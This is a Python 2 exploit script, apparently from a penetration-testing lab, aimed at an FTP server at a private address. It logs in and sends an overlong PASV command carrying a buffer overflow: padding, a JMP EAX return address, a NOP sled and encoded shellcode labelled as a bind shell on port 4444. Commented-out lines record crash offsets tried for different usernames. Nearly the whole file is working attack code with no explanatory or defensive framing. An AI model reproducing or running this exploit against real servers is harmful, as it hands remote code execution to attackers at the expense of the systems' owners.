#!/usr/bin/env python

import socket, time

IP = '10.11.0.27'
PORT = 21
BUFFER_SIZE = 1024
USER = '90909090'
PASS = '90909090'
cmd = "PASV"

# Bind shell, 4444

buf =  ""
buf += "\xd9\xc6\xbb\xf0\x2f\xcb\x91\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x53\x83\xc0\x04\x31\x58\x13\x03\xa8\x3c\x29"
buf += "\x64\xb4\xab\x2f\x87\x44\x2c\x50\x01\xa1\x1d\x50\x75"
buf += "\xa2\x0e\x60\xfd\xe6\xa2\x0b\x53\x12\x30\x79\x7c\x15"
buf += "\xf1\x34\x5a\x18\x02\x64\x9e\x3b\x80\x77\xf3\x9b\xb9"
buf += "\xb7\x06\xda\xfe\xaa\xeb\x8e\x57\xa0\x5e\x3e\xd3\xfc"
buf += "\x62\xb5\xaf\x11\xe3\x2a\x67\x13\xc2\xfd\xf3\x4a\xc4"
buf += "\xfc\xd0\xe6\x4d\xe6\x35\xc2\x04\x9d\x8e\xb8\x96\x77"
buf += "\xdf\x41\x34\xb6\xef\xb3\x44\xff\xc8\x2b\x33\x09\x2b"
buf += "\xd1\x44\xce\x51\x0d\xc0\xd4\xf2\xc6\x72\x30\x02\x0a"
buf += "\xe4\xb3\x08\xe7\x62\x9b\x0c\xf6\xa7\x90\x29\x73\x46"
buf += "\x76\xb8\xc7\x6d\x52\xe0\x9c\x0c\xc3\x4c\x72\x30\x13"
buf += "\x2f\x2b\x94\x58\xc2\x38\xa5\x03\x8b\x8d\x84\xbb\x4b"
buf += "\x9a\x9f\xc8\x79\x05\x34\x46\x32\xce\x92\x91\x35\xe5"
buf += "\x63\x0d\xc8\x06\x94\x04\x0f\x52\xc4\x3e\xa6\xdb\x8f"
buf += "\xbe\x47\x0e\x25\xb6\xee\xe1\x58\x3b\x50\x52\xdd\x93"
buf += "\x39\xb8\xd2\xcc\x5a\xc3\x38\x65\xf2\x3e\xc3\x98\x5f"
buf += "\xb6\x25\xf0\x4f\x9e\xfe\x6c\xb2\xc5\x36\x0b\xcd\x2f"
buf += "\x6f\xbb\x86\x39\xa8\xc4\x16\x6c\x9e\x52\x9d\x63\x1a"
buf += "\x43\xa2\xa9\x0a\x14\x35\x27\xdb\x57\xa7\x38\xf6\x0f"
buf += "\x44\xaa\x9d\xcf\x03\xd7\x09\x98\x44\x29\x40\x4c\x79"
buf += "\x10\xfa\x72\x80\xc4\xc5\x36\x5f\x35\xcb\xb7\x12\x01"
buf += "\xef\xa7\xea\x8a\xab\x93\xa2\xdc\x65\x4d\x05\xb7\xc7"
buf += "\x27\xdf\x64\x8e\xaf\xa6\x46\x11\xa9\xa6\x82\xe7\x55"
buf += "\x16\x7b\xbe\x6a\x97\xeb\x36\x13\xc5\x8b\xb9\xce\x4d"
buf += "\xbb\xf3\x52\xe7\x54\x5a\x07\xb5\x38\x5d\xf2\xfa\x44"
buf += "\xde\xf6\x82\xb2\xfe\x73\x86\xff\xb8\x68\xfa\x90\x2c"
buf += "\x8e\xa9\x91\x64"

# JMP EAX: 0x71a57080
jmp = "\x80\x70\xa5\x71" #jump to EAX


# We get different offsets for different usernames
#crash = "A"*100 + jmp + "C"*(2500 - 100 - 4) # mmmmmm / mmmmmmm
#crash = "A"*123 + jmp + "C"*(2127 - 123 - 4) # exploit / exploit
crash = "A"*8 + "\xeb\x75" +"A"*113 + jmp + "\x90"*4 + buf + "C"*(2500 - 123 - 4 - 4 - len(buf)) # exploit / exploit
 

print "Connecting to " + IP + " on port "+str(PORT)
print ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((IP, PORT))
except:
    print "[-] Connection to " + IP + " failed!"
    sys.exit(0)

s.send("USER " + USER + "\r\n")
s.recv(1024)
s.send("PASS " + PASS + "\r\n")
s.recv(1024)
print s.recv(BUFFER_SIZE);
time.sleep(2)

s.send("PASV " + crash + "\r\n")  
s.close()
